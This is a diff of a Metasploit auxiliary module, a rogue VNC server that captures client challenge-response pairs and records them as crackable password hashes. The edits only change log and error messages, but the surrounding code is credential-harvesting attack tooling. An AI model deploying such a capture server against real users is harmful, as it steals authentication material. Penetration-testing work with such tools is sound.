@@ -46,7 +46,6 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("CHALLENGE syntax must match 00112233445566778899AABBCCDDEEFF")
 			return
 		end
-		print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
 		exploit()
 	end
 
@@ -66,8 +65,6 @@ class Metasploit3 < Msf::Auxiliary
 	def on_client_data(c)
 		data = c.get_once
 		return if not data
-
-		peer = "#{c.peerhost}:#{c.peerport}"
 
 		if data =~ /^RFB (.*)\n$/
 			@state[c][:proto] = $1
@@ -91,7 +88,7 @@ class Metasploit3 < Msf::Auxiliary
 		elsif @state[c][:chall]
 			c.put [0x00000001].pack("N")
 			c.close
-			print_status("#{peer} - Challenge: #{@challenge.unpack('H*')[0]}; Response: #{data.unpack('H*')[0]}")
+			print_status("VNC LOGIN: #{@state[c][:name]} Challenge: #{@challenge.unpack('H*')[0]}; Response: #{data.unpack('H*')[0]}")
 			hash_line = "$vnc$*#{@state[c][:chall].unpack("H*")[0]}*#{data.unpack('H*')[0]}"
 			report_auth_info(
 				:host  => c.peerhost,
@@ -113,7 +110,7 @@ class Metasploit3 < Msf::Auxiliary
 		# we have got the protocol sorted out and have offered the VNC sectype (2)
 		elsif @state[c][:proto] == "003.007"
 			if ( data.unpack("C")[0] != 2 )
-				print_error("#{peer} - sectype not offered! #{data.unpack("H*")}")
+				print_error("Error: #{@state[c][:name]} Client chose a sectype that was not offered! #{data.unpack("H*")}")
 				c.close
 				return
 			end
